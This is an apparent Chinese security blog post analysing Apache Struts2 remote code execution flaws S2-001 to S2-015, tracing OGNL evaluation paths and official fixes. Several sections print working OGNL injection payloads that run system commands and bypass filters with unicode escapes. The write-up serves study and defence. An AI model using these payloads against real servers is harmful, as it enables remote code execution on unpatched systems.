---
title: 从零开始学java web - struts2 RCE分析
date: 2019-09-23 17:02:05
tags:
- java
- struts2
- rce
---

最近在研究一些Java相关的问题时候，虽然有能力读java的代码，但是从没深入了解过Java的我不免总是在各种只有Java上才有的特性上栽坑，于是忽然觉得可能需要了解一些java的漏洞，本篇文章没有太多干货，主要是自己在研究过程中的一些记录吧。

ps:在分析过程中觉得S2的官方真是傻逼，东填一下西补一下还指望能修复漏洞，真是不懂...

<!--more-->

# S2-001

Remote code exploit on form validation error

poc:
```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

这个漏洞的核心在于，form的验证错误时，会解析ognl语法，导致命令执行

## 漏洞分析

当表单内容输入后，参数会一直传递到

`struts2-core-2.0.8.jar!\org\apache\struts2\components\UIBean.class` function evaluateParams

![image.png-124kB][1]

参数本身会被经过一次处理为`%{password}`

然后一路跟入语法到`xwork-2.0.3-sources.jar!\com\opensymphony\xwork2\util\TextParseUtil.java`

![image.png-61kB][2]

当获取到`{`时，其中包裹的内容会被传入findValue函数执行。

其关键就在于，这里通过while解析，导致，如果我们伪造password为恶意的ognl表达式如`%{1+1}`那么，这层语句就会被再次循环执行。

## 修复

这里最终加入的循环递归深度判断，当完成解析之后就直接跳出。

![image.png-31.2kB][3]


# S2-003&S2-005

XWork ParameterInterceptors bypass allows OGNL statement execution

S2-003和S2-005是同一个漏洞的本体和修复绕过。

poc:
```
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)
```

回显poc:
```
('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(kxlzx)(kxlzx)&('\u0023mycmd\u003d\'ipconfig\'')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)')(bla)(bla)&(A)(('\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())')(bla))&(B)(('\u0023myres\u003dnew\40byte[51020]')(bla))&(C)(('\u0023mydat.readFully(\u0023myres)')(bla))&(D)(('\u0023mystr\u003dnew\40java.lang.String(\u0023myres)')(bla))&('\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)&(E)(('\u0023myout.getWriter().println(\u0023mystr)')(bla))
```

这个漏洞的核心问题在于xwork在获取到传入的参数时，如果我们可以传入#号就可以访问Ognl的上下文对象，但默认#号回被过滤，导致可以用`\u0023`或`\43`来绕过。

S2-005中通过增加安全配置来禁止静态方法调用和类方法执行，然而如果我们可以访问Ognl的上下文对象，就可以通过修改配置来绕过。

## 漏洞分析

当我们传入参数时，在`xwork-core-2.1.6.jar!\com\opensymphony\xwork2\interceptor\ParametersInterceptor.class` line 186获取参数

![image.png-72.2kB][4]

并且预设了`denyMethodExecution: true`。为了能够调用方法，poc的第一部分需要将denyMethodExecution设置为False。

然后进入
```
setParameters(action, stack, parameters);
```

在解析之前，还需要进行一次判断
![image.png-128.9kB][5]

这里主要是通过正则表达式`[[\p{Graph}\s]&&[^,#:=]]*`这里主要过滤了部分特殊字符，如果我们使用unicode来代替`#`这里就成功跳过了判断。

这部分的处理主要来自于`ognl-2.7.3-sources.jar!\ognl\JavaCharStream.java` readChar函数。

当`\`之后为`u`时，则会进行专门的处理，`\u0023`就会转化为`#`

![image.png-62.4kB][6]

## Ognl 

这个漏洞的核心在于`#`的过滤被绕过，导致我们可以访问Ognl的上下文对象，也就导致了命令执行，我们可以来详细看看poc原理

S2-005的payload如下
```
('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean("false")))&(asdf)(('\u0023rt.exit(1)')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1
```

上面的poc分成三个部分

1、`('#_memberAccess['allowStaticMethodAccess']')(meh)=true`
2、`&(aaa)(('#context['xwork.MethodAccessor.denyMethodExecution']=#foo')(#foo=new%20java.lang.Boolean("false")))`

这里主要是关闭两个禁用方法

3、`&(asdf)(('#rt.exit(1)')(#rt=@java.lang.Runtime@getRuntime()))=1`

最后就是执行命令

# S2-007

User input is evaluated as an OGNL expression when there’s a conversion error. This allows a malicious user to execute arbitrary code.

这个漏洞的成因在于，在S2中，关于表单我们可以设置每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭合引号导致ognl的语法解析。

poc
```
%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29+%2B+%27
```

## 漏洞分析

跟随参数到`xwork-core-2.2.3.jar!\com\opensymphony\xwork2\interceptor\ConversionErrorInterceptor.class` ConversionErrorInterceptor

![image.png-185.3kB][7]

函数从`entry.getValue()`获取到输入的参数，当运算出现错误的时候，那么这时候就会发起强制类型转换，然后进入函数`getOverrideExpr`。

在函数`getOverrideExpr`中，传入的参数会在两边拼接单引号。

我们传入的
```
'+(#application)+'
```

就会转为
```
''+(#application)+''
```

然后就可以逃逸字符串的包裹，接下来解析Ognl语法并导致代码执行。

## 漏洞修复

在Struts2.2.3.1中修复了这个漏洞，其修复原理是引入了`StringEscape`函数转义单引号，从而无法逃逸单引号的包裹，也就无法导致Ognl表达式解析了。

![image.png-20.7kB][8]

# S2-008

1、Remote command execution in Struts <= 2.2.3 (ExceptionDelegator)

When an exception occurs while applying parameter values to properties, the value is evaluated as an OGNL expression. For example, this occurs when setting a string value to an integer property. Since the values are not filtered an attacker can abuse the power of the OGNL language to execute arbitrary Java code leading to remote command execution. This issue has been reported (https://issues.apache.org/jira/browse/WW-3668) and was fixed in Struts 2.2.3.1. However the ability to execute arbitrary Java code has been overlooked.
2、Remote command execution in Struts <= 2.3.1 (CookieInterceptor)

The character whitelist for parameter names is not applied to the CookieInterceptor. When Struts is configured to handle cookie names, an attacker can execute arbitrary system commands with static method access to Java functions. Therefore the flag allowStaticMethodAccess can be set to true within the request.
3、Arbitrary File Overwrite in Struts <= 2.3.1 (ParameterInterceptor)

While accessing the flag allowStaticMethodAccess within parameters is prohibited since Struts 2.2.3.1 an attacker can still access public constructors with only one parameter of type String to create new Java objects and access their setters with only one parameter of type String. This can be abused in example to create and overwrite arbitrary files. To inject forbidden characters into a filename an uninitialized string property can be used.
4、Remote command execution in Struts <= 2.3.17 (DebuggingInterceptor)

While not being a security vulnerability itself, please note that applications running in developer mode and using the DebuggingInterceptor are prone to remote command execution as well. While applications should never run in developer mode during production, developers should be aware that doing so not only has performance issues (as documented) but also a critical security impact.

简单研究了下S2-008的各种公告，不难发现这其实还是S2-003的另一种类型的绕过，自Struts2.2.1.1以来，引入了标志位`xwork.MethodAccessor.denyMethodExecution=true`和`allowStaticMethodAccess=false`来防止访问上下文变量，且引入了改进过的字符白名单`acceptedParamNames = "[a-zA-Z0-9\.][()_']+";`，但是在部分情况下，这种禁止会失效，这就是S2-008的成因。

我们主要关注2和4，其中2是指之前的限制并没有包含cookie模块所以导致了问题，而第四种则是由于需要开始debug模式才能利用。

POC:
```
http://localhost:8888/devmode.action?debug=command&expression=%28%23application%29

```

## 漏洞分析

直接跟入到漏洞核心位置`struts2-core-2.2.3.jar!\org\apache\struts2\interceptor\debugging\DebuggingInterceptor.class`

![image.png-182kB][9]

当devMode开启时，如果传入的debug为console，那么传入的expression就会直接传入findvalue函数中，这个函数中会解析相应的ognl语法。

## 漏洞修复

修复的主要方式是通过增加ParametersInterceptor中关于参数的匹配，增加了其中cookie部分的校验，只是在普遍的tomcat场景下，cookie的名称有限制，不能加入太多字符，导致无法利用。

反而是devmode可能更有机会一点儿，不过也是非默认配置。

## S2-009

ParameterInterceptor vulnerability allows remote command execution

在S2-003和S2-005之后，攻击者又找到了绕过ParametersInterceptor中正则的攻击payload，其原理在于当传入`(ONGL)(1)`时，会将前者视为Ognl表达式来执行，这其实也是前面S2-003和S2-005的poc原理，在前面已经提到过了。

由于我一直配不好官方的showcase环境，这个漏洞的详细信息就暂时搁置。

漏洞的主要修复方式是通过修改正则表达式来修复的，从
```
private String acceptedParamNames = "[a-zA-Z0-9\.\]\[\(\)_']+";
```

修复成了
```
private String acceptedParamNames = "\w+((\.\w+)|(\[\d+\])|(\(\d+\))|(\['\w+'\])|(\('\w+'\)))*";
```

# S2-012

这个漏洞的成因其实和前面的003、005、009的源头一致，其区别点就在于入口点。这个漏洞的关键点在于当用户传入的参数作为了重定向的参数时，其内容会被二次解析，并被解释为Ognl表达式。

这里可以直接用S2-001中的payload，本身框架没有任何的限制。

## 漏洞原理

当action中配置重定向时使用了重定向变量，则变量会直接解析为Ognl表达式。

```
<package name="S2-012" extends="struts-default">
	<action name="user" class="com.demo.action.UserAction">
		<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
		<result name="input">/index.jsp</result>
		<result name="success">/index.jsp</result>
	</action>
</package>
```


# S2-013

A vulnerability, present in the includeParams attribute of the URL and Anchor Tag, allows remote command execution

在S2中`s:url`和`s:a`这两个标签都提供了includeParams属性，这个属性主要是用于标志是否包含http请求参数。

- none: URL中不包含参数
- get：URL中只包含GET型参数
- all：URL中包含GET型和POST型参数

而当URL中带有参数的时候，S2会二次处理URL，如果参数中包含恶意的Ognl语句，那么就会按照Ognl语法解析。

poc:
```
http://localhost:8080/S2_013_war_exploded/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27calc%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read%28%23d%29%2C%23out%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23out.println%28%2bnew%20java.lang.String%28%23d%29%29%2C%23out.close%28%29%7D
```

## 漏洞分析

深入跟到`struts2-core-2.2.3.jar!\org\apache\struts2\views\util\UrlHelper.class`

![image.png-96kB][10]

然后跟到函数`buildParameterSubstring`

![image.png-16.1kB][11]

最后进入`translateAndEncode`导致命令执行
![image.png-57.4kB][12]

## 漏洞修复

最开始官方修复这个漏洞是通过限制`%{(#exp)}`来阻止执行的，也正是这样，导致了S2-014的诞生。

所以在接下来的修复中，官方使用了encode函数来代替`translateAndEncode`，在函数中去除了其他的处理，只保留了urlencode功能。

# S2-015

A vulnerability introduced by wildcard matching mechanism or double evaluation of OGNL Expression allows remote command execution.

简单来说就是，当服务端的参数或者action使用请求通配符动态引用，那么这个部分参数会被二次处理，并被Ognl解析。

但由于这部分的位置比较特殊，平时常用的一些符号都不能用。

poc:
```
http://localhost:8080/S2-015/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec('calc')}.action

```

## 漏洞分析

首先分析跟到`xwork-core-2.3.14.2-sources.jar!\com\opensymphony\xwork2\DefaultActionInvocation.java`返回包处理

![image.png-63.1kB][13]


然后跟入`struts2-core-2.3.14.2-sources.jar!\org\apache\struts2\dispatcher\HttpHeaderResult.java`可以看到在处理相应的action配置

![image.png-49.4kB][14]

直接匹配上解析执行

## 漏洞修复

最后通过限制这些部分的字符来解决问题
```
[a-z]*[A-Z]*[0-9]*[.\-_!/]*
```


  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/cmil8bv3wv8592sutv0dbyep/image.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/mlwvf00mi58jlqh605a91185/image.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/pxpjlwykpgggdms4lxm27zgc/image.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/u5v2n7g4080hawat8lr3p6xn/image.png
  [5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/ar1ks3jmcchlnjd37tmmhc27/image.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/3pxtgw2juw6nsfsm4vmhxdyy/image.png
  [7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/lyn5amkmmra6rbmuers34knr/image.png
  [8]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/kifut0voqab6sssl3mgyk2pf/image.png
  [9]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/cgy92yszm7yvvqovc1z9603a/image.png
  [10]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/7sth7twxxrnajq77w6epgica/image.png
  [11]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/rk9uc9eqftqi6a7tbwdh223m/image.png
  [12]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/3cz9e9mbrl4dr99lisrw8s1a/image.png
  [13]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/z55ena7gzy4r83e4iz3y43fo/image.png
  [14]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/e195qeml6rrnez3f2ndgcnlu/image.png
